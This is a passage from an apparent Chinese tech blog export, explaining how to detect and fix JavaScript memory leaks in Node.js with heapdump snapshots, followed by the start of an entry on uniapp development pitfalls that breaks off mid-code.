<h2 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h2><p>内存泄漏常常与闭包紧紧联系在一起，很容易让人误以为闭包就会导致内存泄漏。其实<strong>闭包只是让内存常驻</strong>，而<strong>滥用闭包才会导致内存泄漏</strong>。<br>内存泄漏，从广义上说就是，<strong>内存在使用完毕之后</strong>，<strong>对于不再要的内存没有及时释放或者无法释放</strong>。<strong>不再需要的</strong>内存使用完毕之后肯定需要释放掉，否则这个块内存就浪费掉了，相当于内存泄漏了。<strong>但是在实际中，往往不会通过判断该内存或变量是否不再需要使用来判断</strong>。因为内存测试工具很难判断该内存是否不再需要。所以我们通常会<strong>重复多次执行某段逻辑链路</strong>，然后<strong>每隔一段时间进行一次内存 dump</strong>，然后<strong>判断内存是否存在不断增长的趋势</strong>，如果存在，则可用怀疑存在内存泄漏的可能。</p>
<h2 id="内存-dump"><a href="#内存-dump" class="headerlink" title="内存 dump"></a>内存 dump</h2><p>浏览器中抓取内存的 dump 相对来说简单些，<strong>直接通过谷歌浏览器的调试工具找到 memory 对应的 tab 页面</strong>，然后<strong>点击 Load</strong>即可开始抓取内存 dump，如：</p>
<p><img data-src="https://image-static.segmentfault.com/329/036/3290363206-6015354b85cdf" alt="img05"></p>
<p>在 NodeJS 中，我们也可以通过引入 heapdump 来抓取内存 dump，直接通过 npm 安装 heapdump 模块即可。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install heapdump</span><br></pre></td></tr></table></figure>

<p>安装完成之后，即可直接在应用程序中使用了，用法非常简单，如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> heapdump = <span class="built_in">require</span>(<span class="string">&quot;heapdump&quot;</span>);</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;start.heapsnapshot&quot;</span>); <span class="comment">// 记录应用开始时的内存dump</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 应用code部分</span></span><br><span class="line"></span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;end.heapsnapshot&quot;</span>); <span class="comment">// 记录应用结束时的内存dump</span></span><br></pre></td></tr></table></figure>

<p>应用程序执行完成后，会在<strong>应用根目录</strong>中生成 start.heapsnapshot 和 end.heapsnapshot 两个内存 dump 文件，我们可以<strong>通过判断两个文件的大小变化来判断是否存在内存泄漏</strong>。</p>
<p>当然<strong>并不是说内存 dump 文件的大小不断增大就存在内存泄漏</strong>，如果应用的访问量确实在一直增大，那么内存曲线只增不减也属于正常情况，<strong>我们只能根据具体情况判断是否存在内存泄漏的可能</strong>。</p>
<h2 id="常见的内存泄露"><a href="#常见的内存泄露" class="headerlink" title="常见的内存泄露"></a>常见的内存泄露</h2><h3 id="闭包循环引用"><a href="#闭包循环引用" class="headerlink" title="闭包循环引用"></a>闭包循环引用</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> heapdump = <span class="built_in">require</span>(<span class="string">&quot;heapdump&quot;</span>);</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;start.heapsnapshot&quot;</span>); <span class="comment">// 记录应用开始时的内存dump</span></span><br><span class="line"><span class="keyword">let</span> foo = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">outer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> bar = foo;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">unused</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// 未使用到的函数</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`bar is <span class="subst">$&#123;bar&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    foo = &#123;</span><br><span class="line">        <span class="comment">// 给foo变量重新赋值</span></span><br><span class="line">        <span class="attr">bigData</span>: <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">100000</span>).<span class="title function_">join</span>(<span class="string">&quot;this_is_a_big_data&quot;</span>), <span class="comment">// 如果这个对象携带的数据非常大，将会造成非常大的内存泄漏</span></span><br><span class="line">        <span class="attr">inner</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`inner method run`</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">outer</span>();</span><br><span class="line">&#125;</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;end.heapsnapshot&quot;</span>); <span class="comment">// 记录应用结束时的内存dump</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，执行了 1000 次 outer 函数，start.heapsnapshot 文件的大小为 2.4M，而 end.heapsnapshot 文件的大小为 4.1M，所以可能存在内存泄漏。<br>前面讲解闭包的过程中，我们已经可以知道 outer 函数内部是存在闭包的，因为<strong>outer 函数内部定义了 unused 和 inner 两个函数</strong>，虽然 inner 函数中没有使用到 outer 函数中的变量，但是<strong>unused 函数内部使用到了 outer 函数中的 bar 变量</strong>，故形成闭包，<strong>inner 函数也会共享 outer 函数提供的闭包作用域</strong>。<br>由于闭包的存在，<strong>bar 变量不能释放</strong>，即相当于<strong>inner 函数隐式持有了 bar 变量</strong>，所以存在**…–&gt;foo–&gt;inner–&gt;bar–&gt;foo(赋值给 bar 的 foo，即上一次的 foo)…<strong>。<br>这里 inner 隐式持有 bar 变量怎么理解呢？因为</strong>inner 是一个闭包函数<strong>，</strong>可以使用 outer 提供的闭包作用域中的 bar 变量<strong>，由于闭包的关系，bar 变量不能释放，所以</strong>bar 变量一直在内存中<strong>，而</strong>bar 变量又指向了上一次赋值给 bar 的 foo 对象**，所以会存在这样一个引用关系。</p>
<p>那怎么解决呢？由于 bar 变量常驻内存不能释放，所以我们可以<strong>在 outer 函数执行完毕的时候手动释放</strong>，即<strong>将 bar 变量置为 null</strong>，这样<strong>之前赋值给 bar 的 foo 对象就没有被其他变量引用了</strong>，就会被回收了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> heapdump = <span class="built_in">require</span>(<span class="string">&quot;heapdump&quot;</span>);</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;start.heapsnapshot&quot;</span>); <span class="comment">// 记录应用开始时的内存dump</span></span><br><span class="line"><span class="keyword">let</span> foo = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">outer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> bar = foo;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">unused</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// 未使用到的函数</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`bar is <span class="subst">$&#123;bar&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    foo = &#123;</span><br><span class="line">        <span class="comment">// 给foo变量重新赋值</span></span><br><span class="line">        <span class="attr">bigData</span>: <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">100000</span>).<span class="title function_">join</span>(<span class="string">&quot;this_is_a_big_data&quot;</span>), <span class="comment">// 如果这个对象携带的数据非常大，将会造成非常大的内存泄漏</span></span><br><span class="line">        <span class="attr">inner</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`inner method run`</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    bar = <span class="literal">null</span>; <span class="comment">// 手动释放bar变量，解除bar变量对上一次foo对象的引用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">outer</span>();</span><br><span class="line">&#125;</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;end.heapsnapshot&quot;</span>); <span class="comment">// 记录应用结束时的内存dump</span></span><br></pre></td></tr></table></figure>

<p>手动释放 bar 变量是一种相对比较好的解决方式。关键在于<strong>要解除闭包解除 bar 变量对上一次 foo 变量的引用</strong>。所以我们可以<strong>让 unused 方法内不使用 bar 变量</strong>，或者<strong>将 bar 变量的定义放在一个块级作用域中</strong>，如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> heapdump = <span class="built_in">require</span>(<span class="string">&quot;heapdump&quot;</span>);</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;start.heapsnapshot&quot;</span>); <span class="comment">// 记录应用开始时的内存dump</span></span><br><span class="line"><span class="keyword">let</span> foo = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">outer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 将bar变量定义在一个块级作用域内，这样outer函数中就没有定义变量了，自然inner也不会形成闭包</span></span><br><span class="line">        <span class="keyword">let</span> bar = foo;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">unused</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="comment">// 未使用到的函数</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`bar is <span class="subst">$&#123;bar&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    foo = &#123;</span><br><span class="line">        <span class="comment">// 给foo变量重新赋值</span></span><br><span class="line">        <span class="attr">bigData</span>: <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">100000</span>).<span class="title function_">join</span>(<span class="string">&quot;this_is_a_big_data&quot;</span>), <span class="comment">// 如果这个对象携带的数据非常大，将会造成非常大的内存泄漏</span></span><br><span class="line">        <span class="attr">inner</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`inner method run`</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">outer</span>();</span><br><span class="line">&#125;</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;end.heapsnapshot&quot;</span>); <span class="comment">// 记录应用结束时的内存dump</span></span><br></pre></td></tr></table></figure>

<h3 id="重复注册事件"><a href="#重复注册事件" class="headerlink" title="重复注册事件"></a>重复注册事件</h3><p>比如页面一进入就重复注册 1000 个同名事件(一次模拟每次进入页面都注册一次事件)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> heapdump = <span class="built_in">require</span>(<span class="string">&quot;heapdump&quot;</span>);</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;start.heapsnapshot&quot;</span>); <span class="comment">// 记录应用开始时的内存dump</span></span><br><span class="line"><span class="keyword">const</span> events = <span class="built_in">require</span>(<span class="string">&quot;events&quot;</span>);</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Page</span> <span class="keyword">extends</span> <span class="title class_ inherited__">events.EventEmitter</span> &#123;</span><br><span class="line">    <span class="title function_">onShow</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">on</span>(<span class="string">&quot;ok&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;on ok signal.&quot;</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">onDestory</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> page = <span class="keyword">new</span> <span class="title class_">Page</span>();</span><br><span class="line">page.<span class="title function_">setMaxListeners</span>(<span class="number">0</span>); <span class="comment">// 设置可以注册多个同名事件</span></span><br><span class="line">page.<span class="title function_">onShow</span>();</span><br><span class="line">page.<span class="title function_">onDestory</span>();</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;end.heapsnapshot&quot;</span>); <span class="comment">// 记录应用结束时的内存dump</span></span><br></pre></td></tr></table></figure>

<p>这个例子中 Page 页面一进入就会同时注册 1000 个同名的 ok 事件，start.heapsnapshot 文件的大小为 2.4M，而 end.heapsnapshot 文件的大小为 2.5M，所以可能存在内存泄漏。<br>解决方式就是，<strong>在页面离开的时候移除所有事件</strong>，或者<strong>在页面创建的时候仅注册一次事件</strong>，如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> heapdump = <span class="built_in">require</span>(<span class="string">&quot;heapdump&quot;</span>);</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;start.heapsnapshot&quot;</span>); <span class="comment">// 记录应用开始时的内存dump</span></span><br><span class="line"><span class="keyword">const</span> events = <span class="built_in">require</span>(<span class="string">&quot;events&quot;</span>);</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Page</span> <span class="keyword">extends</span> <span class="title class_ inherited__">events.EventEmitter</span> &#123;</span><br><span class="line">    <span class="title function_">onCreate</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">on</span>(<span class="string">&quot;ok&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 仅在页面创建的时候注册一次事件，避免重复注册事件</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;on ok signal.&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">onShow</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// for (let i = 0; i &lt; 1000; i++) &#123;</span></span><br><span class="line">        <span class="comment">//     this.on(&quot;ok&quot;, () =&gt; &#123;</span></span><br><span class="line">        <span class="comment">//         console.log(&quot;on ok signal.&quot;);</span></span><br><span class="line">        <span class="comment">//     &#125;);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">onLeave</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">removeAllListeners</span>(<span class="string">&quot;ok&quot;</span>); <span class="comment">// 或者在离开页面的时候移除所有ok事件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> page = <span class="keyword">new</span> <span class="title class_">Page</span>();</span><br><span class="line">page.<span class="title function_">setMaxListeners</span>(<span class="number">0</span>); <span class="comment">// 设置可以注册多个同名事件</span></span><br><span class="line">page.<span class="title function_">onCreate</span>();</span><br><span class="line">page.<span class="title function_">onShow</span>();</span><br><span class="line">page.<span class="title function_">onLeave</span>();</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;end.heapsnapshot&quot;</span>); <span class="comment">// 记录应用结束时的内存dump</span></span><br></pre></td></tr></table></figure>

<h3 id="意外的全局变量"><a href="#意外的全局变量" class="headerlink" title="意外的全局变量"></a>意外的全局变量</h3><p>这是我们常常简单的内存泄漏例子，实际上内存工具很难判断意外的全局变量是否存在内存泄漏，除非应用程序不断的往这个全局变量中加入数据，否则<strong>对于一个恒定不变的意外全局变量内存测试工具是无法判断出是否存在内存泄漏的</strong>，所以我们<strong>尽量不要随意使用全局变量来保存数据</strong>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> heapdump = <span class="built_in">require</span>(<span class="string">&quot;heapdump&quot;</span>);</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;start.heapsnapshot&quot;</span>); <span class="comment">// 记录应用开始时的内存dump</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createBigData</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> bigData = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">100</span>; j++) &#123;</span><br><span class="line">        bigData.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10000</span>).<span class="title function_">join</span>(<span class="string">&quot;this_is_a_big_data&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bigData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    foo = <span class="title function_">createBigData</span>(); <span class="comment">// 意外的全局变量导致内存泄漏</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">100</span>; j++) &#123;</span><br><span class="line">    <span class="title function_">fn</span>();</span><br><span class="line">&#125;</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;end.heapsnapshot&quot;</span>); <span class="comment">// 记录应用结束时的内存dump</span></span><br></pre></td></tr></table></figure>

<p>该例子执行后，end.heapsnapshot 文件的大小为 2.5M 也变成了 2.5M，<strong>执行 fn 函数的时候意外产生了一个全局变量 foo</strong>，并赋值为了一个很大的数据，如果 foo 变量用完后我们不再需要，那么我们就要主动释放，否则常驻内存造成内存泄漏，如果这个全局变量我们后续还需要使用到，那么就不算内存泄漏。<br>解决方法就是，将 foo 定义成局部变量，如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> heapdump = <span class="built_in">require</span>(<span class="string">&quot;heapdump&quot;</span>);</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;start.heapsnapshot&quot;</span>); <span class="comment">// 记录应用开始时的内存dump</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createBigData</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> bigData = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">100</span>; j++) &#123;</span><br><span class="line">        bigData.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10000</span>).<span class="title function_">join</span>(<span class="string">&quot;this_is_a_big_data&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bigData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// foo = createBigData(); // 意外的全局变量导致内存泄漏</span></span><br><span class="line">    <span class="keyword">const</span> foo = <span class="title function_">createBigData</span>(); <span class="comment">// 将foo定义为局部变量，避免内存泄漏</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">100</span>; j++) &#123;</span><br><span class="line">    <span class="title function_">fn</span>();</span><br><span class="line">&#125;</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;end.heapsnapshot&quot;</span>); <span class="comment">// 记录应用结束时的内存dump</span></span><br></pre></td></tr></table></figure>

<h3 id="事件未及时销毁"><a href="#事件未及时销毁" class="headerlink" title="事件未及时销毁"></a>事件未及时销毁</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> heapdump = <span class="built_in">require</span>(<span class="string">&quot;heapdump&quot;</span>);</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;start.heapsnapshot&quot;</span>); <span class="comment">// 记录应用开始时的内存dump</span></span><br><span class="line"><span class="keyword">const</span> events = <span class="built_in">require</span>(<span class="string">&quot;events&quot;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createBigData</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> bigData = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">100</span>; j++) &#123;</span><br><span class="line">        bigData.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">100000</span>).<span class="title function_">join</span>(<span class="string">&quot;this_is_a_big_data&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bigData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Page</span> <span class="keyword">extends</span> <span class="title class_ inherited__">events.EventEmitter</span> &#123;</span><br><span class="line">    <span class="title function_">onCreate</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="title function_">createBigData</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">handler</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">update</span>(data);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">on</span>(<span class="string">&quot;ok&quot;</span>, <span class="variable language_">this</span>.<span class="property">handler</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">update</span>(<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;开始更新数据了&quot;</span>); <span class="comment">// 接收到ok信号，可以开始更新数据了</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">onDestory</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> page = <span class="keyword">new</span> <span class="title class_">Page</span>();</span><br><span class="line">page.<span class="title function_">onCreate</span>();</span><br><span class="line">page.<span class="title function_">onDestory</span>();</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;end.heapsnapshot&quot;</span>); <span class="comment">// 记录应用结束时的内存dump</span></span><br></pre></td></tr></table></figure>

<p>此例中页面 onCreate 的时候会注册一个 ok 事件，事件处理函数为 this.handler，this.handler 的定义会形成一个闭包，导致 data 无法释放，从而内存溢出。<br>解决办法就是<strong>移除事件</strong>并<strong>清空 this.handler</strong>，因为 this.handler 这个闭包函数被两个变量持有，一个是<strong>page 对象的 handler 属性持有</strong>，另一个是<strong>事件处理器由于注册事件后被事件处理器所持有</strong>。所以需要释放 this.handler 并且移除事件监听。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> heapdump = <span class="built_in">require</span>(<span class="string">&quot;heapdump&quot;</span>);</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;start.heapsnapshot&quot;</span>); <span class="comment">// 记录应用开始时的内存dump</span></span><br><span class="line"><span class="keyword">const</span> events = <span class="built_in">require</span>(<span class="string">&quot;events&quot;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createBigData</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> bigData = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">100</span>; j++) &#123;</span><br><span class="line">        bigData.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">100000</span>).<span class="title function_">join</span>(<span class="string">&quot;this_is_a_big_data&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bigData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Page</span> <span class="keyword">extends</span> <span class="title class_ inherited__">events.EventEmitter</span> &#123;</span><br><span class="line">    <span class="title function_">onCreate</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="title function_">createBigData</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">handler</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">update</span>(data);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">on</span>(<span class="string">&quot;ok&quot;</span>, <span class="variable language_">this</span>.<span class="property">handler</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">update</span>(<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;开始更新数据了&quot;</span>); <span class="comment">// 接收到ok信号，可以开始更新数据了</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">onDestory</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">removeListener</span>(<span class="string">&quot;ok&quot;</span>, <span class="variable language_">this</span>.<span class="property">handler</span>); <span class="comment">// 移除ok事件，解决事件处理器对this.handler闭包函数的引用</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">handler</span> = <span class="literal">null</span>; <span class="comment">//解除page对象对this.handler闭包函数的引用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> page = <span class="keyword">new</span> <span class="title class_">Page</span>();</span><br><span class="line">page.<span class="title function_">onCreate</span>();</span><br><span class="line">page.<span class="title function_">onDestory</span>();</span><br><span class="line">heapdump.<span class="title function_">writeSnapshot</span>(<span class="string">&quot;end.heapsnapshot&quot;</span>); <span class="comment">// 记录应用结束时的内存dump</span></span><br></pre></td></tr></table></figure>

<p>解除 page 对象和事件处理器对象对 this.handler 闭包函数的引用后，this.handler 闭包函数就会被释放，从而解除闭包，data 也会得到释放。</p>
]]></content>
      <categories>
        <category>经典文章</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>uniapp开发问题汇总</title>
    <url>/2022/12/03/20221203-uniapp%E5%BC%80%E5%8F%91%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<p>汇总 uniapp 开发过程中遇到的一些问题与对应解决的解决方案。</p>
<span id="more"></span>

<h2 id="运行小程序-props-传值，对象方法丢失"><a href="#运行小程序-props-传值，对象方法丢失" class="headerlink" title="运行小程序 props 传值，对象方法丢失"></a>运行小程序 props 传值，对象方法丢失</h2><p>自定义组件父子组件 prop 传递的变量为对象时，对象内部含有函数属性，该函数属性会直接被删除。</p>
<p>因为为 uniapp 在传递数据的时候使用的是<code>JSON.parse(JSON.stringify(obj1))</code>这样传递的，无法传递函数。</p>
<p>了解更多，<a href="https://blog.csdn.net/qq_40445661/article/details/118539610">详见</a></p>
<h2 id="image-组件-load、-error-事件名不能是-onLoad、onError"><a href="#image-组件-load、-error-事件名不能是-onLoad、onError" class="headerlink" title="image 组件@load、@error 事件名不能是 onLoad、onError"></a>image 组件@load、@error 事件名不能是 onLoad、onError</h2><p>如果是 onLoad、onError，编译会报错。</p>
<h2 id="小程序无法通过-document-获取-DOM-节点信息"><a href="#小程序无法通过-document-获取-DOM-节点信息" class="headerlink" title="小程序无法通过 document 获取 DOM 节点信息"></a>小程序无法通过 document 获取 DOM 节点信息</h2><p>如果有获取元素距离顶部的间距这样一个场景，小程序无法通过 document 来获取相关信息，需要用到<code>uni.createSelectorQuery()</code>。用法以下几点需要注意：</p>
<ul>
<li>使用 uni.createSelectorQuery() 需要指定的 DOM 节点已渲染完成后。</li>
<li>支付宝小程序不支持 in(component)，使用无效果</li>
</ul>
<p>提取公共的方法，兼容实现方案以下几种：</p>
<p><strong>mixin</strong></p>
<p>&#x2F;&#x2F; common.mixin.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">getElemRect</span>(<span class="params">selector, all</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> query =  uni.<span class="title function_">createSelectorQuery</span>()</span><br><span class="line">      <span class="comment">// #ifndef MP-ALIPAY</span></span><br><span class="line">      .<span class="title function_">in</span>(<span class="variable language_">this</span>);</span><br><span class="line">    <span class="comment">// #endif</span></span><br><span class="line">    query[all ? <span class="string">&#x27;selectAll&#x27;</span> : <span class="string">&#x27;select&#x27;</span>](selector)</span><br><span class="line">      .<span class="title function_">boundingClientRect</span>(<span class="function"><span class="params">rect</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (all &amp; <span class="title class_">Array</span>.<span class="title function_">isArray</span>(rect) &amp;&amp; rect.<span class="property">length</span>) &#123;</span><br><span class="line">          <span class="title function_">resolve</span>(rect);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!all &amp;&amp; rect) &#123;</span><br><span class="line">          <span class="title function_">resolve</span>(rect);</span><br><span class="line">        &#125;</span><br><span class="line">      